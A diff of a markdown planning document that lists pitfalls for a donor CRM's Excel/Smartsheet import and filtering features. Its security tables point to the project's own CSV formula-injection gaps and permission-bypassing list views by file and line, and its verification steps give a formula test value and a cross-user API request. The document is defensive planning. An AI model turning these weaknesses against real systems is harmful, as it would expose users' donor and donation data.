-    list(events)  # Force evaluation
-
-print(queries[0]['sql'])
-# Should show "Index Scan using stageevent_contact_journal_created"
-```
-
-**Detection:**
-- Django Debug Toolbar showing queries >100ms
-- PostgreSQL slow query log showing sequential scans
-- `EXPLAIN ANALYZE` showing "Seq Scan" instead of "Index Scan"
-
-**Phase:** Phase 1 (Data Model) — add indexes during migration creation
-
-**Guideline:** Add composite index for every common filter+order_by pattern. Profile with `EXPLAIN ANALYZE` before production deploy.
-
-## Phase-Specific Warnings
-
-| Phase Topic | Likely Pitfall | Mitigation |
-|-------------|---------------|------------|
-| Phase 1: Data Model | N+1 queries from event replay (Pitfall #1) | Design with denormalized current_stage field, not pure event sourcing |
-| Phase 1: Data Model | Missing composite indexes (Pitfall #13) | Add indexes for (contact, journal, created_at) patterns during migration |
-| Phase 1: Data Model | Signal infinite loops (Pitfall #9) | Use `update()` instead of `save()` in signal handlers, test signal chains |
-| Phase 2: Decision Tracking | Atomic transaction scope bugs (Pitfall #2) | Use `@transaction.atomic` for all multi-model writes, write tests for rollback scenarios |
-| Phase 2: Decision Tracking | History queries without pagination (Pitfall #8) | Design history API with pagination from start, default 25 records |
-| Phase 2: Stage Events | Sequential validation too rigid/loose (Pitfall #6) | Implement warnings not errors, log skip metadata for analytics |
-| Phase 3: Grid UI | Cell re-render cascade (Pitfall #4) | Use React.memo and prop minimization from first implementation |
-| Phase 3: Grid UI | No virtualization for >50 rows (Pitfall #7) | Enable TanStack Virtual before testing with realistic data |
-| Phase 3: Grid UI | Checkmark lies about freshness (Pitfall #5) | Design visual language for freshness (color, recency text) in mockups |
-| Phase 3: Grid UI | No optimistic updates (Pitfall #10) | Implement optimistic updates for all grid mutations using React Query |
-| Phase 3: Grid UI | Hover tooltip spam (Pitfall #11) | Add 300ms debounce to hover fetches, cache tooltip data |
-| Phase 4: Reports | CSV export memory issues (Pitfall #12) | Use streaming response with iterator for exports >1000 rows |
+## Technical Debt Patterns
+
+Shortcuts that seem reasonable but create long-term problems.
+
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| Loading entire Excel file with `file.read()` instead of `read_only=True` | Simpler parsing code | OOM on 10MB+ files; crash on 512MB Render tier | Never for Excel; use `read_only=True` always |
+| Storing column mapping only in React `useState` | No backend model needed | Lost on refresh; user re-does 5min of mapping work | Acceptable if wizard has < 5 steps and < 30 seconds of work |
+| Hard-coding Smartsheet column patterns (e.g., "First Name" variations) | Quick auto-detection | New column naming patterns require code changes | MVP only; add user-configurable patterns in v1.4 |
+| Skipping `distinct()` on M2M group filter | One less method call | Duplicate contacts in filtered results | Never; always use `distinct()` with M2M filters |
+| Using `useState` per filter instead of shared URL hook | Familiar pattern | Broken bookmarks, filter state desync, copy-paste errors | Prototyping only; extract hook before launch |
+| Disabling dark mode for new import wizard "temporarily" | Ship feature faster | Users in dark mode can't use import feature; brand inconsistency | Never; test in both modes during development |
+| Not profiling queries after adding filters | Faster development | N+1 or sequential scan discovered in production at 5k contacts | Never; profile with Django Debug Toolbar before merge |
+| Reusing `parse_contacts_csv` directly for Excel data | Less code | Breaks when Excel sends datetime/float types instead of strings | Never; add normalization layer between openpyxl and existing parsers |
+
+## Integration Gotchas
+
+Common mistakes when connecting Excel parsing to existing import pipeline.
+
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| openpyxl + dates | Assuming all dates are strings | Handle `datetime`, `int` (serial), and `str` types with `normalize_cell_value()` |
+| openpyxl + merged cells | Reading row 1 for headers | Scan first 5 rows, skip rows where >50% cells are None |
+| openpyxl + memory | Using default mode for file parsing | Always use `read_only=True` and `data_only=True`; call `wb.close()` after |
+| openpyxl + encoding | Assuming UTF-8 throughout | Excel files are binary (ZIP containing XML); use `file` object not `file.read().decode()` |
+| DjangoFilterBackend + M2M | Adding `groups` to `filterset_fields` | Use manual filter with `distinct()` in `get_queryset()` |
+| DjangoFilterBackend + permissions | Trusting filter_backends to enforce access | Override `get_queryset()` to scope by owner BEFORE filters apply |
+| React `useSearchParams` | Creating separate `useState` for each filter | Use URL params as single source of truth via shared hook |
+| Tailwind dark mode | Using `text-gray-500`, `bg-white` | Use semantic `text-muted-foreground`, `bg-background` |
+| Smartsheet checkbox columns | Expecting boolean values | Handle `"True"`/`"False"` strings from Smartsheet exports |
+
+## Performance Traps
+
+Patterns that work at small scale but fail as usage grows.
+
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| Loading all Excel rows into Python list | Fast with 100 rows | Use openpyxl `read_only=True` with `iter_rows()` | >10k rows or >10MB file |
+| N+1 queries in filtered list views | Fine with 10 contacts | `select_related()` / `prefetch_related()` in `get_queryset()` | >100 items with related serializer fields |
+| M2M group filter without `distinct()` | Invisible with 0-1 groups per contact | Always call `distinct()` after M2M filter | Contact belongs to 2+ groups |
+| No pagination on import history | Works with 10 imports | Paginate ImportRun list, limit to 50 per page | >200 import runs |
+| Synchronous Excel file processing | Responsive for small files | Add Celery task for files >5MB or >1000 rows | >5MB files or >1000 rows |
+| Unbounded error list in import results | Manageable with 10 errors | Limit to first 20 errors + total count (existing pattern) | >100 row errors |
+| All filter dropdown options loaded eagerly | Works with 10 missionaries | Lazy-load owner dropdown with search/autocomplete | >50 missionaries |
+| Combined multi-filter query without composite index | Fast with <1000 contacts | Add composite indexes for common filter combos | >5000 contacts with 3+ active filters |
+
+## Security Mistakes
+
+Domain-specific security issues beyond general web security.
+
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| No formula injection check on `parse_contacts_csv()` text fields | Data exfiltration when exported CSV opened in Excel | Add `FORMULA_PREFIXES` check to ALL text fields in ALL parsers |
+| Adding `owner` to filterset_fields for non-admin users | Cross-user data enumeration via `?owner=X` parameter | Scope `get_queryset()` by user; exclude `owner` from non-admin FilterSet |
+| `IsContactOwnerOrReadAccess` only checks `has_object_permission()` | Any user can view any contact's donations/pledges via ListAPIView | Fix permission class or override `get_queryset()` with owner filter |
+| No file type validation beyond extension check | Malicious file upload (crafted .xlsx containing XML bombs) | Validate magic bytes (PK for .xlsx ZIP); set file size limits |
+| No rate limiting on import endpoint | Resource exhaustion from repeated large imports | Add DRF throttling: 10 imports per hour per user |
+| Excel macros executing during openpyxl parsing | Macro execution not actually a risk (openpyxl doesn't execute macros) | Non-issue but document for user confidence: "Macros are ignored during import" |
+
+## UX Pitfalls
+
+Common user experience mistakes in this domain.
+
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| Column mapping with only drag-drop | Keyboard and mobile users blocked | Provide dropdown select fallback alongside any drag-drop |
+| No preview of mapped data before import | User imports wrong mapping, must undo | Show 3-5 preview rows with mapped column values before confirm |
+| Cryptic error: "Invalid date format: 44927" | User cannot diagnose Excel serial number issue | Show "Row 5: Date column contains number '44927'. Expected date format like '2024-01-15'" |
+| No visual indicator of active filters | User forgets filters are active, sees incomplete data | Show active filter badges/pills with X to remove; "Clear All" button |
+| Losing column mapping state on browser refresh | User rage-quits after redoing 5 minutes of mapping work | Persist mapping to sessionStorage; add beforeunload warning |
+| All-or-nothing import on Smartsheet data | One bad row blocks entire import; user must fix whole file | Skip invalid rows, import valid ones, provide error CSV download (existing pattern) |
+| Filter applies on every keystroke in search | Requests fire for every character typed; flickering results | Debounce search input (300ms); other filters apply on selection |
+| No count indicator next to filter options | User doesn't know if a filter has results before clicking | Show count badge: "Donor (42)" next to filter option |
+
+## "Looks Done But Isn't" Checklist
+
+Things that appear complete but are missing critical pieces.
+
+- [ ] **Excel import:** Tested with .xlsx but not with merged cells, serial number dates, Smartsheet checkbox columns, or LibreOffice exports
+- [ ] **Column mapping UI:** Works with mouse but not keyboard; no "Skip this column" option; no preview of mapped values
+- [ ] **Filter state:** UI state syncs on filter click, but bookmarked URL doesn't restore filter dropdowns on page load
+- [ ] **Dark mode:** New import wizard components use `bg-background` but custom elements (error badges, progress bar, file drop zone) use hard-coded colors
+- [ ] **Import validation:** Happy path works, but no tests for formula injection payloads, Excel serial number dates, or 10MB file uploads
+- [ ] **Permission checks:** ContactList has owner scoping, but ContactDonationsView and ContactPledgesView still bypass permissions on list endpoints
+- [ ] **Query performance:** Filters work with 10 test contacts; not profiled with 5000+ contacts and M2M group joins
+- [ ] **Error messages:** Validation errors show field names from code (`contact_first_name`) not user-friendly names ("First Name")
+- [ ] **File upload feedback:** Shows spinner but no progress percentage, file name, or estimated time for large files
+- [ ] **Mapping state persistence:** Works during session but lost on refresh, back button, or accidental navigation
+- [ ] **Filter debounce:** Search input fires API request on every keystroke instead of debounced
+- [ ] **Accessibility:** Column mapper has no ARIA labels; filter dropdowns work with mouse but not keyboard navigation
+
+## Recovery Strategies
+
+When pitfalls occur despite prevention, how to recover.
+
+| Pitfall | Recovery Cost | Recovery Steps |
+|---------|---------------|----------------|
+| Formula injection in imported data | MEDIUM | Data migration to sanitize: prefix formula-like strings with `'` character; review all contacts/donations for formula prefixes |
+| Permission bypass exploited | HIGH | Patch `get_queryset()` immediately; audit access logs for cross-user access patterns; notify affected users |
+| N+1 queries causing slow filtered pages | LOW | Add `select_related()`/`prefetch_related()` to view's `get_queryset()`; deploy as hotfix |
+| Dark mode broken in new features | LOW | Grep for hard-coded colors, replace with semantic classes; deploy within hours |
+| Memory exhaustion from large Excel upload | MEDIUM | Add `DATA_UPLOAD_MAX_MEMORY_SIZE` to settings; switch to `read_only=True` mode; redeploy |
+| Float precision errors in filter comparisons | MEDIUM | Fix `monthly_equivalent` to use Decimal; retest all filter queries that reference pledge amounts |
+| Broken CSV imports after shared code modification | HIGH | Revert shared code changes immediately; restore original functions; add full regression test suite before re-attempting |
+| Duplicate contacts from M2M filter | LOW | Add `.distinct()` to queryset; clean duplicate API responses already cached in frontend |
+| Filter state desync (URL vs UI) | LOW | Extract shared `useFilterParams` hook; refactor all filter handlers to use it |
+| Excel serial number dates imported as text | MEDIUM | Data migration to parse integer fields as dates where they match serial number range; update affected records |
+
+## Pitfall-to-Phase Mapping
+
+How roadmap phases should address these pitfalls.
+
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Permission bypass in list views (#5) | Phase 0 (Security prerequisite) | Attempt `GET /api/v1/contacts/{other_user_uuid}/donations/` as regular user; verify empty/404 |
+| Float arithmetic in monthly_equivalent (#11) | Phase 0 (Quality prerequisite) | `Decimal('100') / Decimal('3') * Decimal('3') == Decimal('100')` passes exact equality |
+| Excel serial number dates (#1) | Phase 1 (Excel parsing) | Import file with serial number dates (44927); verify correct date (2023-01-01) |
+| Merged cells in headers (#2) | Phase 1 (Excel parsing) | Import file with merged header row; verify non-merged row detected as headers |
+| Breaking existing CSV imports (#3) | Phase 1 (Excel parsing) | Run ALL existing tests: `test_fund_import.py`, `test_entity_import.py`, `test_transaction_import.py`, `test_pledge_import.py` |
+| Formula injection on import (#4) | Phase 1 (Excel parsing) | Import file with `=1+1` in first_name field; verify rejection |
+| Memory exhaustion (#7) | Phase 1 (Excel parsing) | Upload 10MB Excel file; monitor RSS memory; verify no OOM |
+| Smartsheet export quirks (#10) | Phase 2 (Column mapping UI) | Import real Smartsheet export with hidden columns and checkboxes; verify mapping works |
+| M2M group filter duplicates (#6) | Phase 3 (Filtering backend) | Filter contacts by group where contacts belong to multiple groups; verify no duplicates |
+| Filter query performance (#6) | Phase 3 (Filtering backend) | Apply 3 filters simultaneously on 1000+ contacts; verify <10 queries and <500ms response |
+| Filter state desync (#8) | Phase 4 (Filtering frontend) | Bookmark URL with 3 active filters; reload page; verify all filters restored in UI |
+| Dark mode audit scope (#9) | Phase 5 (Quality audit) | Predefined checklist of pages to audit; pass/fail criteria documented before starting |
 
 ## Sources
 
-**Event Sourcing:**
-- [GitHub - pyeventsourcing/eventsourcing-django](https://github.com/pyeventsourcing/eventsourcing-django)
-- [Event-Driven Architectures with Django](https://www.scoutapm.com/blog/event-driven-architectures-with-django)
-- [Snapshot Strategies: Optimizing Event Replays](https://dev.to/alex_aslam/snapshot-strategies-optimizing-event-replays-36oo)
-- [Optimizing Event Replays - EventSourcingDB](https://docs.eventsourcingdb.io/best-practices/optimizing-event-replays/)
-- [Event Sourcing in production](https://ep2024.europython.eu/session/event-sourcing-in-production/)
+**Excel/Smartsheet Parsing:**
+- [openpyxl Dates and Times](https://openpyxl.readthedocs.io/en/stable/datetime.html) -- serial number handling, 1900 leap year bug
+- [openpyxl merged cells](https://gist.github.com/tchen/01d1d61a985190ff6b71fc14c45f95c9) -- MergedCell type returns None
+- [Smartsheet Export Documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet) -- hidden columns, checkbox export behavior
+- [Smartsheet Excel Export without hidden columns](https://community.smartsheet.com/discussion/144142/excel-export-without-hidden-columns)
 
-**Django Performance:**
-- [Django's transaction.atomic()](https://charemza.name/blog/posts/django/postgres/transactions/not-as-atomic-as-you-may-think/)
-- [The trouble with transaction.atomic](https://seddonym.me/2020/11/19/trouble-atomic/)
-- [Optimize Django Query Performance](https://johnnymetz.com/posts/combine-select-related-prefetch-related/)
-- [Optimizing Django Queries with select_related and prefetch_related](https://medium.com/django-unleashed/optimizing-django-queries-with-select-related-and-prefetch-related-e404af72e0eb)
-- [Django select_related and prefetch_related](https://betterprogramming.pub/django-select-related-and-prefetch-related-f23043fd635d)
+**Security:**
+- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection) -- formula prefix attack vectors
+- [DRF Filtering](https://www.django-rest-framework.org/api-guide/filtering/) -- "ensure unpermitted objects not in results"
+- [DRF Permissions](https://www.django-rest-framework.org/api-guide/permissions/) -- "object permissions only checked via get_object()"
 
-**React Grid Performance:**
-- [React Data Grid Performance - MUI X](https://mui.com/x/react-data-grid/performance/)
-- [React Data Grid Performance - KendoReact](https://www.telerik.com/kendo-react-ui/components/grid/performance)
-- [Advanced Performance Patterns for React Data Grids](https://medium.com/@sapnakul/advanced-performance-patterns-for-react-data-grids-real-world-lessons-generic-solutions-4498e3594581)
-- [Memoization Guide - Material React Table](https://www.material-react-table.com/docs/guides/memoization)
-- [Build Tables in React: Data Grid Performance Guide](https://strapi.io/blog/table-in-react-performance-guide)
+**Performance:**
+- [django-filter Performance Issues #1264](https://github.com/carltongibson/django-filter/issues/1264) -- large dataset filtering
+- [10 Tips to Optimize PostgreSQL Queries in Django](https://blog.gitguardian.com/10-tips-to-optimize-postgresql-queries-in-your-django-project/)
+- [Django and the N+1 Queries Problem](https://www.scoutapm.com/blog/django-and-the-n1-queries-problem)
 
-**Data Freshness & UX:**
-- [Stale Data: How to Identify and Mitigate](https://www.acceldata.io/blog/how-to-identify-and-eliminate-stale-data-to-optimize-business-decisions)
-- [Data Freshness Best Practices](https://www.elementary-data.com/post/data-freshness-best-practices-and-key-metrics-to-measure-success)
-- [PatternFly Stale Data Warning](https://www.patternfly.org/component-groups/status-and-state-indicators/stale-data-warning/)
+**Frontend Filtering:**
+- [Why URL state matters: useSearchParams](https://blog.logrocket.com/url-state-usesearchparams/) -- single source of truth pattern
+- [Advanced React state management using URL parameters](https://blog.logrocket.com/advanced-react-state-management-using-url-parameters/)
 
-**Pipeline & Kanban:**
-- [Kanban Board Best Practices](https://gmelius.com/blog/kanban-board-strategy-guide)
-- [Pipeline Kanban View to Power Sales Performance](https://www.moonstride.com/pipeline-kanban-view/)
-- [Data Validation in ETL - 2026 Guide](https://www.integrate.io/blog/data-validation-etl/)
-- [Validation Pipelines](https://www.secoda.co/glossary/validation-pipelines)
+**Dark Mode:**
+- [Dark Mode - Tailwind CSS](https://tailwindcss.com/docs/dark-mode) -- class-based dark mode strategy
+- [Simple dark mode with Tailwind and CSS variables](https://invertase.io/blog/tailwind-dark-mode)
+
+**Existing Codebase (HIGH confidence):**
+- `apps/imports/services.py` -- formula injection gaps in parse_contacts_csv/parse_donations_csv
+- `apps/contacts/views.py:139-171` -- ContactDonationsView/ContactPledgesView permission bypass
+- `apps/pledges/models.py:138-146` -- float arithmetic in monthly_equivalent
+- `apps/core/permissions.py:65-98` -- IsContactOwnerOrReadAccess only implements has_object_permission
+- `.planning/EDGE_CASE_AUDIT.md` -- known issues #2, #3.1, #4.1, #6.1
+- `frontend/src/pages/contacts/ContactList.tsx:63-65` -- URL param filter pattern to extend
+- `frontend/src/styles/globals.css` -- CSS variable theming system
 
 ---
-
-*Research confidence: MEDIUM-HIGH*
-*Areas researched: Event sourcing patterns, Django atomic transactions, React grid performance, data freshness UX, sequential pipeline validation*
-*Gaps: Specific DonorCRM codebase patterns (mitigated by reading existing ARCHITECTURE.md and STACK.md)*
+*Pitfalls research for: DonorCRM v1.3 -- Smartsheet Import, Filters & Polish*
+*Researched: 2026-02-16*
